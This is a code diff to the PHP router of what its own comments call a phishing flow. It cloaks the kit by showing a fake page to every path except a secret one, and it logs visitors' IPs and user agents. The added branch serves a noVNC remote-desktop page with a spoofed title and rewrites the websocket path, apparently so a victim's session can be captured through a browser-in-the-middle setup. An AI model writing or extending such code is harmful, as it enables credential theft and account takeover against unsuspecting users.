@@ -21,14 +21,31 @@ $log = function ($type) use ($path, $logFile) {
     @file_put_contents($logFile, "$ts | $type | $ip | $path | $ua\n", FILE_APPEND | LOCK_EX);
 };
 
-// Only the exact secret path gets the phishing flow; everything else (including /) gets the fake page.
+// Only the exact secret path gets the phishing flow or VNC; everything else gets the fake page only.
 $config = @parse_ini_file(__DIR__ . '/php.ini', false);
 $secretPath = isset($config['SECRET_PATH']) ? trim($config['SECRET_PATH']) : '12098e2fklj.html';
 $secretPath = ltrim($secretPath, '/');
 $secretPathFull = ($secretPath !== '') ? '/' . $secretPath : null;
 
-// Phishing flow only for the exact secret path (never for / or empty path)
+// Exact secret path only: either VNC (if session ready) or phishing flow
 if ($secretPathFull !== null && $path === $secretPathFull) {
+    $vncReady = @file_exists('/tmp/vnc_ready');
+    if ($vncReady) {
+        $log('VNC_SESSION');
+        $vncHtml = file_get_contents(__DIR__ . '/noVNC/vnc_lite.html');
+        $vncHtml = str_replace('<head>', '<head><base href="/' . $secretPath . '/">', $vncHtml);
+        $vncHtml = str_replace("readQueryVariable('path', 'websockify')", "'" . $secretPath . "/websockify'", $vncHtml);
+        $titlePath = __DIR__ . '/title.txt';
+        if (is_readable($titlePath)) {
+            $title = trim(file_get_contents($titlePath));
+            if ($title !== '') {
+                $vncHtml = preg_replace('/<title>\s*<\/title>/', '<title>' . htmlspecialchars($title) . '</title>', $vncHtml);
+            }
+        }
+        header('Content-Type: text/html; charset=utf-8');
+        echo $vncHtml;
+        return true;
+    }
     $log('PHISHING_FLOW');
     require __DIR__ . '/index.php';
     return true;
